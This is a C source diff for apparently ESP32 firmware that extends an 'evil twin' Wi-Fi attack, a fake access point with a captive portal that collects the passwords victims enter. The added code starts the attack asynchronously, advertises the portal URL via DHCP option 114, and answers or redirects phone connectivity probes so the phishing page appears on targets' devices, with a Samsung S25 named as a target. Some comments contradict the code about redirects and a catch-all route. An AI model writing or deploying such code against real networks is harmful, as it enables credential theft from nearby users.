@@ -15,13 +15,18 @@
 
 #include "evil_twin.h"
 
+#include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
 #include "esp_err.h"
 #include "esp_log.h"
+#include "esp_netif.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/semphr.h"
+#include "freertos/task.h"
+
+#include "sys_prio.h"
 
 #include "cJSON.h"
 #include "dns_server.h"
@@ -64,6 +69,64 @@ void evil_twin_start_attack(const char *ssid) {
   evil_twin_start_attack_with_template(ssid, PATH_HTML_INDEX);
 }
 
+static char s_pending_ssid[33];
+static char s_pending_template[128];
+
+// Bringing the portal up (Wi-Fi stop/AP switch + settle delay + DNS/HTTP start)
+// takes ~1.5 s. Running it inline in the SPI dispatch blocks the bridge that long
+// and the P4's start command times out, so it never heartbeats and the session
+// watchdog tears the portal down. Do the heavy start on a task so the dispatch
+// returns immediately with the session id.
+static void evil_twin_start_task(void *arg) {
+  (void)arg;
+  evil_twin_start_attack_with_template(s_pending_ssid,
+                                       s_pending_template[0] ? s_pending_template : NULL);
+  vTaskDelete(NULL);
+}
+
+void evil_twin_start_attack_async(const char *ssid, const char *template_path) {
+  if (ssid == NULL)
+    return;
+  strncpy(s_pending_ssid, ssid, sizeof(s_pending_ssid) - 1);
+  s_pending_ssid[sizeof(s_pending_ssid) - 1] = '\0';
+  if (template_path != NULL) {
+    strncpy(s_pending_template, template_path, sizeof(s_pending_template) - 1);
+    s_pending_template[sizeof(s_pending_template) - 1] = '\0';
+  } else {
+    s_pending_template[0] = '\0';
+  }
+  xTaskCreatePinnedToCore(
+      evil_twin_start_task, "evil_start", 4096, NULL, SYS_PRIO_SERVICE_LO, NULL, SYS_CORE_MAIN);
+}
+
+// RFC 7710 (DHCP option 114): advertise the captive-portal URL in the DHCP offer.
+// Modern clients - notably Samsung One UI, which ignores the HTTP/HTTPS probe
+// heuristics and just reports "connected, no internet" - read this and surface the
+// sign-in page directly. The URI buffer must stay alive: esp_netif stores the
+// pointer, not a copy.
+static char s_captive_portal_uri[32];
+
+static void set_captive_portal_dhcp_option(void) {
+  esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
+  if (netif == NULL) {
+    ESP_LOGW(TAG, "AP netif not found; cannot set DHCP captive-portal option");
+    return;
+  }
+  esp_netif_ip_info_t ip_info;
+  if (esp_netif_get_ip_info(netif, &ip_info) != ESP_OK)
+    return;
+  snprintf(
+      s_captive_portal_uri, sizeof(s_captive_portal_uri), "http://" IPSTR, IP2STR(&ip_info.ip));
+
+  esp_netif_dhcps_stop(netif);
+  esp_err_t err = esp_netif_dhcps_option(
+      netif, ESP_NETIF_OP_SET, ESP_NETIF_CAPTIVEPORTAL_URI, s_captive_portal_uri,
+      strlen(s_captive_portal_uri));
+  esp_netif_dhcps_start(netif);
+  ESP_LOGI(TAG, "DHCP captive-portal URI (option 114): %s (%s)", s_captive_portal_uri,
+           esp_err_to_name(err));
+}
+
 void evil_twin_start_attack_with_template(const char *ssid, const char *template_path) {
   init_storage_mutex();
   ESP_LOGI(TAG, "Starting Evil Twin: %s", ssid);
@@ -78,6 +141,7 @@ void evil_twin_start_attack_with_template(const char *ssid, const char *template
   s_last_password[0] = '\0';
 
   wifi_service_change_to_hotspot(ssid);
+  set_captive_portal_dhcp_option();
   start_dns_server();
   vTaskDelay(pdMS_TO_TICKS(ATTACK_START_DELAY_MS));
 
@@ -91,6 +155,12 @@ void evil_twin_stop_attack(void) {
   if (s_storage_mutex != NULL) {
     vSemaphoreDelete(s_storage_mutex);
     s_storage_mutex = NULL;
+  }
+  if (s_uploaded_template != NULL) {
+    free(s_uploaded_template);
+    s_uploaded_template = NULL;
+    s_uploaded_template_size = 0;
+    s_uploaded_template_offset = 0;
   }
   ESP_LOGI(TAG, "Evil Twin logic stopped.");
 }
@@ -202,6 +272,18 @@ static esp_err_t passwords_get_handler(httpd_req_t *req) {
 }
 
 static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
+  char host[64] = {0};
+  httpd_req_get_hdr_value_str(req, "Host", host, sizeof(host));
+  ESP_LOGI(TAG, "http: GET %s host=%s -> portal 200", req->uri, host);
+
+  // Serve the portal (HTTP 200) on every path and host, with no redirect. The OS
+  // probe (e.g. /generate_204 expecting 204, /hotspot-detect.html expecting
+  // "Success") instead gets our page, so the client concludes "captive portal" and
+  // opens the sign-in sheet on this page. Serving the content directly beats a 302:
+  // the target S25 was not following the redirect.
+  httpd_resp_set_hdr(req, "Connection", "close");
+  httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+
   // Serve from uploaded RAM buffer if available
   if (s_uploaded_template != NULL && s_uploaded_template_offset >= s_uploaded_template_size) {
     http_service_send_response(req, s_uploaded_template, HTTPD_RESP_USE_STRLEN);
@@ -221,6 +303,24 @@ static esp_err_t captive_portal_get_handler(httpd_req_t *req) {
   return ESP_FAIL;
 }
 
+// Serve the portal on everything, no redirects. captive_portal_get_handler answers
+// all GETs (root and the "/*" catch-all); the 404 handler answers any other method
+// or unmatched path. The target S25 would not follow a 302, so we never send one.
+static esp_err_t captive_404_handler(httpd_req_t *req, httpd_err_code_t err) {
+  (void)err;
+  ESP_LOGI(TAG, "http-404: %s method=%d -> 303 /", req->uri, req->method);
+  // IDF captive_portal example parity: funnel every unmatched request to the root
+  // with a 303 See Other AND a body. The example notes a bare redirect is not
+  // enough - iOS (and stricter clients) need content in the response to flag a
+  // portal. The OS probe (/generate_204, ...) sees the redirect instead of its
+  // expected marker and pops the sign-in page.
+  httpd_resp_set_status(req, "303 See Other");
+  httpd_resp_set_hdr(req, "Location", "/");
+  httpd_resp_set_hdr(req, "Connection", "close");
+  httpd_resp_send(req, "Redirect to the captive portal", HTTPD_RESP_USE_STRLEN);
+  return ESP_OK;
+}
+
 static void register_evil_twin_handlers(void) {
   start_web_server();
   httpd_uri_t submit_uri = {.uri = "/submit", .method = HTTP_POST, .handler = submit_post_handler};
@@ -233,9 +333,7 @@ static void register_evil_twin_handlers(void) {
   httpd_uri_t root_uri = {.uri = "/", .method = HTTP_GET, .handler = captive_portal_get_handler};
   http_service_register_uri(&root_uri);
 
-  httpd_uri_t captive_portal_uri = {.uri = "/hotspot-detect.html",
-                                    .method = HTTP_GET,
-                                    .handler = captive_portal_get_handler,
-                                    .user_ctx = NULL};
-  http_service_register_uri(&captive_portal_uri);
+  // No "/*" catch-all: unmatched paths (the OS probes) fall through to the 404
+  // handler, which 303-redirects them to "/" like the IDF example does.
+  http_service_register_404_handler(captive_404_handler);
 }
